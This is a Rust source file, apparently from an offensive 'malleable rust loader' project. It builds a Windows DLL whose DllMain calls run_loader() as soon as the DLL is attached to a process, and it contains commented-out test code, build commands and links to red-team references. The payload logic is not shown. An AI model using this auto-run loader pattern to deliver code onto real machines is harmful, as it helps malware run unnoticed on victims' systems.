use crate::run_loader;
/* 
use windows::core::s;
use windows::{
    Win32::System::SystemServices::*,
    Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK},
};
*/

//https://fluxsec.red/rust-dll-windows-api
//TODO: https://blog.nviso.eu/2020/08/04/debugging-dlls-3-techniques-to-help-you-get-started/

/*
cargo build --target x86_64-pc-windows-gnu  --features debug --features loader --lib --features dll
cd /home/user/malleable-rust-loader/target/x86_64-pc-windows-gnu/debug
lput malleable_rust_loader.dll
*/
// best explanation:
// https://users.rust-lang.org/t/how-to-use-tokio-lib-with-dll-in-windows/61327/3
// https://stackoverflow.com/questions/77294605/library-plugin-manager-in-rust-is-it-even-doable-right-now


#[no_mangle]
#[allow(non_snake_case)]
fn DllMain(_: usize, dw_reason: u32, _: usize) -> i32 {
    match dw_reason {
        _DLL_PROCESS_ATTACH => attach(),
        //_ => (),
    }
    1
}

fn attach() {
    run_loader();
    /*
    unsafe {
        MessageBoxA(None, s!("Hello from MALLEABLE"), s!("MALLEABLE"), MB_OK);
    }
    */
}



// this is a backup to debug DLL into the main.rs
/* 
use ftail::Ftail;
use log::LevelFilter;

CARGO:
ftail = "0.1.2"
#tokio = { version = "1", features = ["rt-multi-thread", "macros"] }


*/
    /* 
    let log_path: &str = "C:\\Users\\user\\Desktop\\log\\";
    let info = &format!("{}", log_path); 
    Ftail::new()
        //.console(LevelFilter::Debug)
        .daily_file(info, LevelFilter::Info)
        .init()
        .unwrap();
    */
    /*
    match tokio::runtime::Runtime::new() {
        Ok(_)=> (),
        Err(e) => error!("e {}",e)
    };
    */
